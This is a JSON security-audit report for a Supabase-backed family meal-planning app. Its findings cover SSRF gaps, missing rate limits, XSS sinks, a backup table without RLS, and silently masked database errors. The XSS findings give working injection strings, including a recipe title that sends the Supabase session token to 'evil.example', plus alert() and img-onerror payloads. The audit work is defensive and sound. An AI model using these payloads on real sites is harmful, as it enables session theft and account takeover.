@@ -1,0 +1,216 @@
+{
+ "rafynd": [
+  {
+   "file": "api/import-recipe.js",
+   "line": 71,
+   "title": "SSRF IP-allowlist saknar CGNAT (100.64.0.0/10) och benchmark (198.18.0.0/15)",
+   "description": "isPrivateIp() blockerar RFC1918, loopback, 0.0.0.0/8, 169.254/16, multicast och några IPv6-fall, men INTE 100.64.0.0/10 (carrier-grade NAT, används av flera molnleverantörer för intern nättrafik/metadata-proxys) eller 198.18.0.0/15 (benchmark). En receptimport-URL vars värd resolvar till t.ex. 100.64.x.x passerar filtret och fetchas server-side, och sidans innehåll returneras som 'recept'. Detta är en separat lucka från den kända DNS-rebinding-TOCTOU:n och de kända IPv6-fallen (::ffff:/NAT64/fe80). Kräver inloggad användare (createHandler -> requireUser), så räckvidden är begränsad idag, men vidgas när M1 öppnar självregistrering.",
+   "severity": "P2",
+   "evidence": "isPrivateIp() (rad 71-90) IPv4-grenen testar a===10/127/0, 169.254, 172.16-31, 192.168, a>=224 — ingen kontroll av 100.64.0.0/10 eller 198.18.0.0/15. handleUrl() (rad 120-124) gör lookup + isPrivateIp per hopp men släpper igenom dessa intervall.",
+   "finder": "sec:auth-cors-secrets"
+  },
+  {
+   "file": "api/import-recipe.js",
+   "line": 61,
+   "title": "Ingen rate limiting på Gemini-drivna endpoints (import-recipe) — kvotutmattning",
+   "description": "import-recipe har ingen throttling/kvot per användare eller hushåll. En inloggad användare (idag familjen; efter M1 vilken självregistrerad användare som helst) kan spamma type:'url'/'photo' och bränna Google Gemini-gratistierns kvot, vilket slår ut receptimport för alla hushåll (delad API-nyckel GOOGLE_API_KEY). Foto-vägen skickar dessutom godtyckligt stor base64-bild (endast Vercels 4.5MB body-tak begränsar) rakt till Gemini per anrop. Ingen kostnad direkt (gratistier) men delad-resurs-DoS och potentiell övergång till betald kvot.",
+   "severity": "P2",
+   "evidence": "Handler (rad 61-67) och handlePhoto/handleUrl anropar callGemini utan någon räknare, IP/håll-baserad gräns eller cooldown. Delad process.env.GOOGLE_API_KEY (rad 108, 296).",
+   "finder": "sec:auth-cors-secrets"
+  },
+  {
+   "file": "api/generate.js",
+   "line": 327,
+   "title": "Ingen rate limiting på generate — tung skriv-/utboundsspam",
+   "description": "generate saknar throttling. Varje anrop gör flera Supabase-läsningar+skrivningar (weekly_plans, meal_days upsert, recipe_history, shopping_lists/items, plan_archives) och vid optimize_prices ett utbound Willys-anrop. En inloggad användare kan loopa endpointen och belasta Supabase free-tier och Vercel-funktionsminuter. Idag familjeintern; efter M1 (självregistrering) blir det en abusevektor mot delad infrastruktur.",
+   "severity": "P2",
+   "evidence": "createSupabaseHandler-wrappad handler (rad 327) utför savePlanToSupabase + activatePlanAtomic + saveHistoryToSupabase + saveShoppingListToSupabase utan anropsgräns; fetchOffersFromWillys (rad 420) vid optimize_prices.",
+   "finder": "sec:auth-cors-secrets"
+  },
+  {
+   "file": "api/shopping.js",
+   "line": 15,
+   "title": "set_preferences skriver ovaliderad klient-JSON till git-repot via GITHUB_PAT",
+   "description": "Action set_preferences tar preferOrganic och preferSwedish rakt från request-body som godtyckliga objekt (ingen typ-/nyckel-/storleks­validering) och committar dem till dispatch-preferences.json på repots main-branch med GITHUB_PAT (contents:write). En inloggad användare kan därmed injicera godtycklig nästlad JSON i en produktionsfil i git-historiken. Sökvägen är hårdkodad ('dispatch-preferences.json') så ingen path-traversal/repo-styrning finns (svar på granskningspunkt 6: klient-input kan INTE påverka path/repo), men innehållet är okontrollerat och skrivs med en repo-bred PAT. Data-integritet/abuse, familjeintern auth idag.",
+   "severity": "P2",
+   "evidence": "shopping.js rad 15-22: prefs.preferOrganic = preferences?.preferOrganic || {} (ingen sanering, till skillnad från blockedBrands som lowercas/trimmas), sedan writeFile('dispatch-preferences.json', prefs, pat, ...) -> github.js writeFile committar till BRANCH=main.",
+   "finder": "sec:auth-cors-secrets"
+  },
+  {
+   "file": "api/import-recipe.js",
+   "line": 341,
+   "title": "Gemini-upstreamens felmeddelande vidarebefordras ordagrant till klienten",
+   "description": "callGeminiRaw kastar new Error(detail) där detail = Googles error.message från upstream-svaret. Eftersom det är ett äkta Error (constructor===Error) klassar handler-wrapperns userMessage() det som 'avsiktligt' och returnerar det ordagrant i 500-svaret — det förbigår den generiska maskeringen som annars döljer tekniska detaljer. Googles meddelanden innehåller inte själva API-nyckeln men kan avslöja intern konfig/kvot-/projektinfo. Låg informationsläcka.",
+   "severity": "P2",
+   "evidence": "import-recipe.js rad 340-342: detail = (await geminiRes.json())?.error?.message; throw new Error(detail || ...). Fångas i createHandler catch (handler.js rad 60-63) -> userMessage returnerar err.message eftersom constructor===Error.",
+   "finder": "sec:auth-cors-secrets"
+  },
+  {
+   "category": "xss",
+   "title": "Hand-rolled attr() JS-string escaper misses backslash → stored XSS via recipe title in day-sheet onclick",
+   "description": "js/weekly-plan/plan-viewer-deluxe.js defines a LOCAL escaper `function attr(s){return String(s==null?'':s).replace(/'/g,\"\\\\'\").replace(/\"/g,'&quot;');}` (line 58) and uses it at line 1090 to embed a recipe TITLE inside a single-quoted JS string in an inline onclick: `onclick=\"dlxCloseSheet();jumpToRecipe('${attr(title)}')\"`. Unlike the project's correct escaper jsStringAttr (js/utils.js:32, which escapes backslash FIRST), attr() only escapes the apostrophe (' -> \\') and does NOT escape backslash. That makes it trivially bypassable: a title ending in a backslash lets the injected backslash consume attr's added backslash, terminating the JS string early. `title` here is `d.recipe`/`d.customRecipeTitle` — a recipe name, which is user-entered AND imported from arbitrary external webpages/photos via Gemini (api/import-recipe). An identical broken attr() is duplicated in js/today/today-view.js:20, and the same replace(/'/g,\"\\\\'\") pattern appears at js/weekly-plan/plan-viewer.js:769 (escDayName). Fix: replace all three with utils.jsStringAttr (already correctly used at js/recipes/recipe-browser.js:113 and js/shopping/dispatch-preferences.js:70).",
+   "severity": "P1",
+   "file": "js/weekly-plan/plan-viewer-deluxe.js",
+   "line": 1090,
+   "evidence": "Title = `Kyckling\\');fetch('https://evil.example/'+localStorage.getItem('sb-...-auth-token'))//` (obtained by importing a recipe from an attacker-controlled webpage via Gemini, or typed by a household member). attr() turns the sole ' into \\', producing `...Kyckling\\\\');fetch(...)//` inside onclick=\"...jumpToRecipe('...')\". The browser parses the JS string as `Kyckling\\` (escaped backslash closes at the following quote), then `);fetch(...)//` executes as arbitrary JS in the victim's authenticated session — exfiltrating the Supabase session token from localStorage (account takeover of that household) or reading/writing all of that household's Supabase data. The vulnerable button renders in the day-sheet 'recipe missing' branch (recipeById(rid) is falsy), reached when a plan/custom-day/archived-plan references a title whose recipe row was deleted. def: plan-viewer-deluxe.js:58; dup def: today-view.js:20; same pattern: plan-viewer.js:769.",
+   "finder": "sec:xss-djup"
+  },
+  {
+   "category": "xss",
+   "title": "Shopping-list category interpolated unescaped into HTML text, a data-attribute and an inline onclick JS string",
+   "description": "js/shopping/shopping-list.js interpolates the item `category` string raw (no escapeHtml/jsStringAttr) in several sinks: HTML text at line 520 (`${CAT_ICONS[cat] || '•'} ${cat}`), 609 (`${icon} ${cat}`) and 630; a double-quoted attribute at line 610 (`data-cat=\"${cat}\"`); and — most seriously — inside a single-quoted JS string in an inline onclick at line 549 via the composed key: `recipeItemLi` builds `key = recipe::${cat}::${idx}` and emits `onclick=\"toggleShopItem(this,'${key}')\"`. Note the sibling `manualItemLi` (lines 569-576) uses the SAFE pattern (`data-key=\"${escapeHtml(key)}\"` + reads this.dataset.key), so recipeItemLi is an inconsistency. Today `category` comes from a closed server-side enum (api/_shared/shopping-builder.js categorize(): Mejeri/Grönsaker/Fisk & kött/Frukt/Skafferi/Övrigt) and manual inserts hard-code 'Övrigt', so this is not reachable through the UI — hence P2 (defense-in-depth). But shopping_items is writable by any household member through the RLS-permitted anon client, so a member (or, post-M1, any onboarded stranger within their own tenant) can PATCH/INSERT a row with an arbitrary `category` value and get stored self-XSS when the list renders.",
+   "severity": "P2",
+   "file": "js/shopping/shopping-list.js",
+   "line": 549,
+   "evidence": "Direct anon-client write within one's own household: `db.from('shopping_items').update({category:\"x'));alert(document.domain);//\"}).eq('id',id)` (RLS allows it). On next render, recipeItemLi emits `onclick=\"toggleShopItem(this,'recipe::x'));alert(document.domain);//::0')\"` — the apostrophe in the category closes the JS string and injects. For the HTML-text sinks a category like `<img src=x onerror=alert(1)>` executes at lines 520/609/630, and `\"><...>` breaks out of data-cat at line 610. Fix: escapeHtml the category in text/attribute contexts and adopt the data-key pattern (already used by manualItemLi) for the onclick key.",
+   "finder": "sec:xss-djup"
+  },
+  {
+   "category": "xss-hardening",
+   "title": "Minor unescaped interpolations: dispatch prefMisses wanted-tags and custom-day day name",
+   "description": "Two low-risk raw interpolations complete the sweep. (1) js/shopping/dispatch-ui.js:96 joins `p.wanted` preference tags without escaping (`[...new Set(data.prefMisses.flatMap(p=>p.wanted||[]))].join('/')`) into innerHTML at line 120 — every other value in renderResult is escaped (m at :86, p.canon at :97). The wanted-tags are a closed server enum (eco/svenskt) so not currently attacker-controllable. (2) js/weekly-plan/plan-viewer.js:805 emits `<div class=\"custom-day-title\">${dayName}</div>` with dayName raw; dayName is a system-generated Swedish weekday name, not user input. Both are safe today but are unescaped interpolations that should use escapeHtml for consistency and to stay safe if their data sources ever widen (e.g. M1 tenancy/premium content).",
+   "severity": "P2",
+   "file": "js/shopping/dispatch-ui.js",
+   "line": 96,
+   "evidence": "dispatch-ui.js:96 `p.wanted` reaches `body.innerHTML = html` (line 120) unescaped; plan-viewer.js:805 `${dayName}` is unescaped HTML text. Neither source is user/external-controlled in the current data model, so no live exploit — flagged as hardening/consistency ahead of onboarding strangers (M1).",
+   "finder": "sec:xss-djup"
+  },
+  {
+   "category": "rls-missing",
+   "severity": "P0",
+   "file": "supabase: public.recipes_qc_backup_20260607 (live DB — no governing migration in db/migrations/)",
+   "title": "Backup-tabell recipes_qc_backup_20260607 har RLS AV + fulla anon-grants — läsbar och raderbar av vem som helst med den publika anon-nyckeln",
+   "description": "Tabellen recipes_qc_backup_20260607 (262 rader, full kopia av recipes per 2026-06-07 inkl. household_id, titlar, ingredienser, instruktioner, anteckningar) har rowsecurity=false medan den samtidigt har SELECT/INSERT/UPDATE/DELETE/TRUNCATE beviljat till rollerna anon OCH authenticated. Alla övriga public-tabeller skyddas av RLS trots samma breda grants, men just den här saknar RLS helt. Anon-nyckeln (sb_publishable_aB6kIJA9j4fyGZ7Df_GEZQ_rDeHjZ5x) är medvetet hårdkodad i frontenden (js/supabase-client.js rad 8) och därmed offentlig. Jag bekräftade LIVE: en oautentiserad GET mot /rest/v1/recipes_qc_backup_20260607 med enbart anon-nyckeln returnerade tabellens rader, medan samma anrop mot riktiga recipes-tabellen returnerade [] (RLS blockerade korrekt). Eftersom anon även har DELETE/TRUNCATE kan vem som helst på internet inte bara läsa utan också radera hela backupen. Detta blir allvarligare när M1 släpper in främmande hushåll: alla hushålls recept som hunnit in i en framtida backup skulle exponeras korsvis. Åtgärd: antingen DROP tabellen (den verkar vara en engångs-QC-backup) eller alter table ... enable row level security + REVOKE ALL FROM anon, authenticated. Ingen kod läser tabellen (grep-verifiera) så en DROP är trolig rätt väg.",
+   "evidence": "pg_tables: recipes_qc_backup_20260607 rowsecurity=false (alla andra=true). role_table_grants: anon+authenticated har DELETE,INSERT,REFERENCES,SELECT,TRIGGER,TRUNCATE,UPDATE. Live PostgREST med anon-nyckel returnerade [{id:1,title:'Gräddig fiskgratäng med purjo',household_id:'71e41d47-...'},...]; riktiga recipes-tabellen gav [] med samma nyckel. count(*)=262.",
+   "finder": "sec:rls-audit"
+  },
+  {
+   "category": "privilege-scope",
+   "severity": "P2",
+   "file": "db/migrations/003_target_servings.sql",
+   "line": 39,
+   "title": "households UPDATE-policy tillåter medlem att skriva alla kolumner på sitt hushåll — riskabelt när tenancy/billing-kolumner tillkommer i M1",
+   "description": "Policyn 'household members update' på households har USING/WITH CHECK = id in (medlemmens hushåll) men ingen kolumn-begränsning. Idag är kolumnerna ofarliga (name, target_servings), så ingen aktuell exponering. Men monetiseringsriktningen (M1: tenancy, prenumeration/Stripe) lägger sannolikt billing-/plan-status på households eller närliggande rad. Om subscription_status, plan_tier, trial_until e.d. hamnar på households kan vilken hushållsmedlem som helst självuppgradera sig gratis via ett rått PATCH mot /rest/v1/households med anon-nyckel + egen JWT, eftersom policyn släpper igenom alla kolumner. Härdning inför M1: lägg billing i en separat tabell som bara service-role skriver (som pricing_status-mönstret), eller använd en kolumn-scopead UPDATE-policy / GRANT UPDATE(name,target_servings). Rapporteras nu som förebyggande eftersom granskningen sker just inför att främmande hushåll släpps in.",
+   "evidence": "pg_policies: households 'household members update' cmd=UPDATE qual/with_check = (id IN (SELECT household_id FROM household_members WHERE user_id=auth.uid())). households-kolumner idag: id, name, created_at, target_servings. authenticated har UPDATE-grant på hela tabellen.",
+   "finder": "sec:rls-audit"
+  },
+  {
+   "category": "privilege-scope",
+   "severity": "P2",
+   "file": "db/migrations/001_activate_plan_atomic.sql",
+   "line": 31,
+   "title": "activate_plan_atomic är EXECUTE-beviljad till anon och är SECURITY INVOKER — anon bör inte kunna anropa RPC:n",
+   "description": "RPC:n activate_plan_atomic har EXECUTE beviljat till både anon och authenticated. Den är SECURITY INVOKER (prosecdef=false), så RLS på weekly_plans/meal_days/plan_archives gäller vid anrop; en anonym anropare saknar auth.uid() → subqueries blir tomma → funktionen träffar 'if not found' och kastar exception utan att skriva något. Alltså ingen korshushålls-skada idag (bekräftat via policy-analys). Men anon har ingen legitim anledning att kunna anropa plan-aktiverings-RPC:n; det är onödig attackyta (t.ex. att trigga upprepade exceptions/last). Härdning: REVOKE EXECUTE ON FUNCTION activate_plan_atomic FROM anon. Notera även att plan_archives saknar DELETE-policy, så trim-DELETE inuti funktionen no-oppar under RLS — det fungerar bara för att api/generate.js anropar RPC:n via service-role; kallas den någonsin via användar-JWT slutar arkiv-trimningen tyst att städa (funktionellt, ej säkerhet).",
+   "evidence": "routine_privileges: activate_plan_atomic EXECUTE till anon+authenticated. pg_proc: prosecdef=false, proconfig=null. pg_policies: plan_archives har bara SELECT+INSERT-policy, ingen DELETE/UPDATE.",
+   "finder": "sec:rls-audit"
+  },
+  {
+   "category": "defense-in-depth",
+   "severity": "P2",
+   "file": "db/migrations/002_pantry_items.sql",
+   "line": 28,
+   "title": "Systemiskt: anon/authenticated har fulla DML+TRUNCATE-grants på ALLA public-tabeller — RLS är enda skyddet, vilket är sprött",
+   "description": "Varje public-tabell har DELETE,INSERT,REFERENCES,SELECT,TRIGGER,TRUNCATE,UPDATE beviljat till både anon och authenticated (Supabases default-grant-mönster). Det fungerar bara så länge RLS är påslaget och korrekt på varje tabell — RLS är alltså den enda barriären. recipes_qc_backup_20260607 (P0 ovan) bevisar att risken är reell: så fort EN tabell får RLS avstängt (t.ex. en ad-hoc backup skapad i SQL-editorn) blir den totalt öppen för hela internet. Härdning / defense-in-depth: (a) inför en rutin/CI-check som larmar om någon public-tabell har rowsecurity=false; (b) överväg att REVOKE TRUNCATE/REFERENCES/TRIGGER från anon,authenticated (behövs aldrig via PostgREST); (c) sätt en policy-mall-checklista så nya tabeller alltid får RLS + alla fyra CRUD-policies innan de exponeras. Extra relevant inför M1 då fler tabeller och fler hushåll tillkommer.",
+   "evidence": "role_table_grants: samtliga 15 public-tabeller listar identiska grants {DELETE,INSERT,REFERENCES,SELECT,TRIGGER,TRUNCATE,UPDATE} för anon och authenticated. Endast RLS skiljer säker från osäker — recipes_qc_backup hade RLS av och blev fullt exponerad.",
+   "finder": "sec:rls-audit"
+  },
+  {
+   "category": "silent-data-loss",
+   "file": "api/generate.js",
+   "line": 200,
+   "severity": "P1",
+   "title": "Regenerering flyttar den aktiva planens dagar UT ur den atomära aktiveringen — ett fel i activatePlanAtomic lämnar en tom aktiv plan (invariant #1)",
+   "description": "savePlanToSupabase gör en UPSERT av meal_days på onConflict (household_id,date). PK:n är (household_id,date) (verifierat mot DB). Vid regenerering av samma vecka (vanligaste fallet) reassignas därför den NUVARANDE aktiva planens överlappande rader till den nya, INAKTIVA planen (plan_id sätts om) — och detta committas som ett eget PostgREST-anrop FÖRE och UTANFÖR den atomära activatePlanAtomic-transaktionen. activate_plan_atomic (RPC finns i DB, verifierat) kör i sin egen transaktion; om den kastar (t.ex. transient Supabase-fel vid free-tier-uppvaknande mitt i requesten, eller en plan_archives-insert som failar) rullas BARA RPC:ns egna ändringar tillbaka — inte den redan committade omflyttningen. Resultat: gamla planen är fortfarande is_active=true men dess överlappande meal_days tillhör nu den inaktiva nya planen. loadActivePlanFromSupabase läser meal_days WHERE plan_id=<gamla planen> (plan-viewer.js:195-199) → familjen ser en tom/trasig matsedel, och 500-svaret döljer att skadan redan skett. Detta motsäger kodens egna upprepade garantier ('den gamla aktiva planen är fortfarande orörd', rad 499-500; '...eller så förblir den gamla planen aktiv med sina dagar intakta', 001-migrationens header). Bekräftade eller pågående inköpslistor för den planen går förlorade.",
+   "evidence": "api/generate.js:200-208 (upsert onConflict household_id,date, committas separat) + 501-504 (savePlanToSupabase → activatePlanAtomic i två steg). DB: meal_days_pkey = PRIMARY KEY (household_id,date); RPC activate_plan_atomic finns. Läsväg: js/weekly-plan/plan-viewer.js:195-199 (meal_days .eq('plan_id', wp.id)). Failscenario: regenerera innevarande vecka → upsert reassignar rader (commit) → RPC:n träffar transient fel → 500 till klient, men aktiv plan nu tömd på överlappande dagar.",
+   "finder": "sec:fundament-felvagar"
+  },
+  {
+   "category": "silent-degradation",
+   "file": "api/deals.js",
+   "line": 34,
+   "severity": "P1",
+   "title": "Live-prisflödet (deals.js) har NOLL degraderingsdetektion — larmbanner + notifyAlert är kopplade enbart till ett dött kodavsnitt",
+   "description": "Prisoptimera-flödet som faktiskt används i UI:t går via GET/POST /api/deals. Om Willys-feeden ändrar format returnerar normalizeOffers [] utan att kasta (willys-offers.js:80-81, 128-158), varpå deals GET returnerar 200 med groups:[] — oskiljbart för UI:t från 'inga reor denna vecka'. deals.js skriver ALDRIG pricing_status och anropar ALDRIG notifyAlert. Hela larm-infrastrukturen (pricing_status-upsert + notifyAlert i generate.js:447-457, och today-view-bannern som läser pricing_status.degraded i today-view.js:216-237) är villkorad av optimize_prices — men den toggeln är borttagen ur index.html (grep: inga träffar på 'optimizePrices' i index.html; plan-generator.js:252 ger då wantsOptimize=false alltid). Följd: den enda live-vägen till prisfeeden saknar larm, medan larmkoden sitter på en väg som aldrig triggas. Willys-feeden kan ruttna i veckor helt tyst — exakt den klass av fel (maskad, osynlig) som Session 121 handlade om.",
+   "evidence": "api/deals.js:34-68 (GET fetchOffersFromWillys → groups filtreras på bestSaving>0 → [] vid tomt; ingen pricing_status/notifyAlert i hela filen). api/willys-offers.js:80-81,138 (normalizeOffers sväljer formatändring → []). generate.js:447-457 (pricing_status + notifyAlert, endast under optimize_prices). index.html: 'optimizePrices' saknas helt. today-view.js:221-226 (bannern läser pricing_status.degraded som deals aldrig sätter).",
+   "finder": "sec:fundament-felvagar"
+  },
+  {
+   "category": "masked-error",
+   "file": "api/generate.js",
+   "line": 89,
+   "severity": "P1",
+   "title": "fetchExistingShoppingList maskerar frågefel som 'ingen lista' → familjens manuellt tillagda inköpsvaror tappas tyst vid regenerering",
+   "description": "fetchExistingShoppingList destrukturerar aldrig error från sina två SELECT (shopping_lists rad 90-95, shopping_items rad 99-104). Vid ett transient frågefel blir lists undefined → '!lists?.length' sant → funktionen returnerar null, exakt samma signal som 'det finns ingen aktiv lista'. Anroparen kan inte skilja fallen åt. saveShoppingListToSupabase använder då existingShop?.manualItems || [] (rad 299) och existingShop?.checkedItems || {} → alla manuellt tillagda varor och bockningar utelämnas ur den nya listan, och den gamla listan deaktiveras (rad 316-317). Familjens egna inköpsrader försvinner tyst vid en regenerering som råkar sammanfalla med en flyktig läsfel mot Supabase (t.ex. free-tier-uppvaknande). Samma mönster finns i confirm.js:42-58 (manual-items-läsning utan error-koll) — droppar manuella varor vid bekräftelse om läsningen fladdrar.",
+   "evidence": "api/generate.js:89-112 (const { data: lists } utan error; return null både vid fel och tom) + 299-308 (manualItems härleds ur existingShop). Spegel i api/confirm.js:42-58. Failscenario: familjen har lagt till 'blöjor, kaffe' manuellt → regenerera medan shopping_lists-läsningen ger ett transient fel → nya listan saknar blöjor+kaffe, gamla listan avaktiverad, inget felmeddelande.",
+   "finder": "sec:fundament-felvagar"
+  },
+  {
+   "category": "masked-error",
+   "file": "api/generate.js",
+   "line": 66,
+   "severity": "P2",
+   "title": "fetchHistory ignorerar frågefel → tomt recency-fönster → matsedeln upprepar nyligen använda recept utan synligt fel",
+   "description": "fetchHistory (rad 66-76) läser recipe_history men destrukturerar aldrig error. Vid ett transient frågefel blir data undefined → usedOn={} → recentlyUsedIds returnerar tom Set → 14-dagarsfiltret i selectRecipes blir en no-op. Genereringen lyckas (200) men kan välja recept som åts i går/förra veckan. Ingen indikation på att historikfiltret var inaktivt. Detta är precis korruptionsvägen audit-punkt #5 efterfrågar: receptvalet blir enformigt/repetitivt utan något synligt fel. Deterministiskt-osynligt eftersom recipe_history är RLS-skyddad och läses med service-role (fel maskeras helt).",
+   "evidence": "api/generate.js:66-76 (const { data } = await db.from('recipe_history')... — error aldrig läst) → recentlyUsedIds(historyData) rad 397 får tom usedOn. Failscenario: recipe_history-SELECT time-outar under free-tier-resume → hela recency-skyddet tyst avstängt för den genereringen.",
+   "finder": "sec:fundament-felvagar"
+  },
+  {
+   "category": "masked-error",
+   "file": "api/generate.js",
+   "line": 265,
+   "severity": "P2",
+   "title": "saveHistoryToSupabase kontrollerar aldrig upsert-felet → recepthistorik registreras tyst inte → framtida upprepningar",
+   "description": "saveHistoryToSupabase gör 'await db.from(\"recipe_history\").upsert(rows, ...)' (rad 271) men läser aldrig det returnerade error-objektet, och anropas utan try/undersökning från handlern (rad 505). Om skrivningen misslyckas (RLS, transient, constraint) registreras inte att veckans recept använts → de faller inte in i 14-dagarsfönstret → nästa generering kan välja samma recept igen. Tyst variantförlust; ingen logg, inget larm.",
+   "evidence": "api/generate.js:265-272 (upsert utan felkoll) anropas rad 505 efter aktivering. Kombinerat med fetchHistory-fyndet ovan är hela historik-loopen fail-silent i båda riktningar.",
+   "finder": "sec:fundament-felvagar"
+  },
+  {
+   "category": "masked-error",
+   "file": "api/generate.js",
+   "line": 507,
+   "severity": "P2",
+   "title": "Inköpslistan skrivs EFTER planaktivering — kastar den, får klienten 500 fast planen redan bytts; klienten kan inte skilja 'lyckades' från 'trasigt'",
+   "description": "Ordningen i handlern är: savePlanToSupabase → activatePlanAtomic → saveHistoryToSupabase → saveShoppingListToSupabase (rad 501-509). Om saveShoppingListToSupabase kastar (t.ex. shopping_items-insert failar) fångar createSupabaseHandler felet och returnerar 500 'Något gick fel'. Men planen är då REDAN aktiverad och historiken skriven — matsedeln HAR bytts, medan svaret säger att allt gick fel och weeklyPlan/shoppingList aldrig returneras. Klienten uppdaterar inte sin vy, tror att inget hände, men vid nästa laddning visas den nya planen (kanske utan matchande inköpslista, eller med den gamla listan fortfarande aktiv). Detta är audit-punkt #2: klienten kan inte skilja tomt/lyckat/trasigt. En framtida utökning som lägger en 6:e skrivning sist ärver samma fälla.",
+   "evidence": "api/generate.js:501-517 (aktivering rad 504, shopping rad 509; handler-catch → 500 i handler.js:84-90 utan att signalera att planen faktiskt bytts). Failscenario: shopping_items-insert bryter mot en framtida constraint → 500 till användaren, men matsedeln är redan utbytt.",
+   "finder": "sec:fundament-felvagar"
+  },
+  {
+   "category": "silent-degradation",
+   "file": "api/generate.js",
+   "line": 260,
+   "severity": "P2",
+   "title": "activatePlanAtomic-fallbacken sväljer archiveOldPlan-fel → icke-atomär väg kan lämna oarkiverade/överlevande gamla meal_days tyst (latent tills RPC saknas)",
+   "description": "Fallbacken (när RPC saknas) kör 'try { await archiveOldPlan(...) } catch (e) { console.error }' och fortsätter oavsett till activatePlan (rad 260-261). Om archiveOldPlan failar delvis (plan_archives-insert eller delete) sväljs felet: den gamla planens icke-överlappande dagar arkiveras aldrig och/eller lämnas kvar som föräldralösa rader (plan_id pekar på en nu inaktiv plan), medan den nya planen ändå aktiveras. Ingen logg-nivå över console.error, inget larm. RPC:n finns för närvarande i DB så vägen är latent — men den är produktionskoden 'både före och efter SQL:en är körd' (kodens egen premiss) och en framtida DB-återställning/ny miljö utan RPC:n återaktiverar den tysta vägen.",
+   "evidence": "api/generate.js:248-262 (isMissingRpcError → fallback; archiveOldPlan i try/catch som bara console.error:ar). archiveOldPlan rad 116-164 (plan_archives-insert + delete utan retur-felkoll).",
+   "finder": "sec:fundament-felvagar"
+  },
+  {
+   "category": "idempotency",
+   "file": "api/dispatch-to-willys.js",
+   "line": 224,
+   "severity": "P2",
+   "title": "Ingen dubbel-dispatch-spärr — två klick fyller Willys-korgen dubbelt; delmängdsfel rapporteras dock korrekt",
+   "description": "runDispatch lägger matchade koder i korgen via cartClient.addProducts men har ingen idempotens-markör (inget dispatched_at på shopping_lists, ingen kontroll av vad som redan ligger i korgen). Två dispatch-anrop (dubbelklick, retry efter timeout där första faktiskt gick igenom) dubblerar kvantiteterna i korgen. Positivt: delmängdsfel (X av Y) surfas explicit via addedCount+missing (rad 103-110) och auth_expired/no_matches särskiljs — den delen ruttnar inte tyst. Men om Willys ändrar addProducts-svarsformat så att res.ok blir sant utan att varan faktiskt läggs till rapporteras falsk framgång. Familje-exklusiv feature (spår #5-6), därav P2.",
+   "evidence": "api/dispatch-to-willys.js:224-287 (runDispatch, ingen idempotensnyckel) + 296-337 (addProductsInBatches förlitar sig helt på res.ok). fetchShoppingListFromSupabase:348-354 läser aktiv lista utan att markera den som dispatchad.",
+   "finder": "sec:fundament-felvagar"
+  }
+ ],
+ "coverage": [
+  {
+   "finder": "auth-cors-secrets",
+   "notes": ""
+  },
+  {
+   "finder": "xss-djup",
+   "notes": "Scope: XSS deep-sweep of all frontend js/. Reviewed the two escapers in js/utils.js: escapeHtml (escapes &<>\\\"' — correct for HTML text and both single/double-quoted attribute values) and jsStringAttr (escapes backslash FIRST, then ' \\\\r \\\\n &<>\\\" — correct for a single-quoted JS string inside a double-quoted attribute). jsStringAttr's only gap is U+2028/U+2029 (JS line-terminators) which it doesn't escape, but a raw LS/PS inside a string literal fails-safe as a SyntaxError (broken handler, not injection); no backtick issue since the JS context is single-quoted. So the shipped utils escapers are sound; the real defect is a DIVERGENT hand-rolled `attr()` (plan-viewer-deluxe.js:58, today-view.js:20) plus the escDayName replace at plan-viewer.js:769 that omit backslash escaping — F1. Audited every innerHTML/insertAdjacentHTML sink across all 18 files that contain them. External/high-risk data traced: Willys product names (prisoptimera.js — escaped at o.name/o.brandLine/m.name/canon/title; deals-popup.js:35,78,86 escaped; dispatch-ui.js:86,97 escaped except the closed-enum wanted-tags at :96), Gemini-imported recipe data (recipe-import.js writes only to form <input>.value via .value assignment — not HTML — and the import preview is textarea-based; the imported title becomes dangerous only later through F1's attr() sink and through recipe-browser.js:113/cook-mode.js/utils.renderDetailInner which all escape correctly), list/note text (lists-view.js — escapeHtml used consistently for list.title, note.title, note.body, i.text, incl. attribute contexts), custom-day note (plan-viewer.js:771 escapes \\\" which is sufficient inside a double-quoted value attribute — no breakout), shopping item names (itemTextCell escapes at :437/:443; manualItemLi uses safe data-key pattern) and categories (F2). Toasts and confirm dialogs (feedback.js) build via textContent — safe even with attacker item names/titles. href/src injection: no user-controlled URL is rendered into an anchor/img — recipe import stores no source link that is later emitted as href; the only href is the constant CART_URL (dispatch-ui.js:105, with rel=noopener). DOM-clobbering surface: all data-* keys carrying identity (data-key, data-id, data-date, data-cat, list/item ids) are UUIDs or ISO dates, not free text. Not in scope / not examined: api/* server-side output encoding, service-worker.js, CSP headers (worth a follow-up: a CSP forbidding inline event handlers would blunt F1/F2, but the app relies heavily on inline onclick so that is a larger refactor). Known-issue exclusions (dispatch/willys JWT, SSRF, getHouseholdId, gist cookies) were respected and not re-reported."
+  },
+  {
+   "finder": "rls-audit",
+   "notes": "DIMENSION: RLS-audit mot live Supabase (projekt zqeznveicagqwblltvsa), read-only via Management-API + en live PostgREST-läsning med den publika anon-nyckeln. Inga DDL/skrivningar kördes. INVENTERING (pg_tables): 15 public-tabeller. 14 har RLS PÅ (recipes, weekly_plans, meal_days, shopping_lists, shopping_items, recipe_history, plan_archives, pantry_items, family_lists, family_list_items, pricing_status, households, household_members, dispatch_preferences). 1 har RLS AV = recipes_qc_backup_20260607 (P0). Ingen tabell har force_rls, men det är ok när ägaren inte träffas av anon/authenticated. Alla efterfrågade tabeller finns och täcks. POLICY-GRANSKNING (pg_policies): household-mallen tillämpas konsekvent — subquery-uttrycken (household_id IN (SELECT household_id FROM household_members WHERE user_id=auth.uid())) är korrekta och identiska på alla hushållsägda tabeller; shopping_items joinar korrekt via shopping_lists→household. Ingen policy använder USING(true). INSERT-policies har WITH CHECK. UPDATE-policies saknar explicit WITH CHECK på flera tabeller (meal_days, recipes, recipe_history, shopping_*, weekly_plans, dispatch_preferences) MEN detta är INTE en sårbarhet: Postgres använder USING-uttrycket som WITH CHECK-fallback när WITH CHECK utelämnas, så nya rader tvingas ändå till medlemmens hushåll (verifierat resonemang). Rapporteras därför ej. KOLUMN-NIVÅ: household_members SELECT-policy = user_id=auth.uid() (medlem ser bara sin EGEN medlemsrad, inte co-medlemmar — restriktivt, bra). households har två redundanta men ekvivalenta SELECT-policies (ofarligt, cleanup). Inga breda korshushålls-SELECT hittades utöver P0. SJÄLVREGISTRERING: household_members och households saknar INSERT/UPDATE/DELETE-policies → RLS default-deny; en användare kan alltså INTE lägga till sig i ett hushåll via anon-nyckeln (bekräftat, självregistrering är AV som avsett). auth.users=3, household_members=3, households=1, distinct member users=3 → inga främmande/orphan-users, alla 3 auth-användare är medlemmar i det enda hushållet. 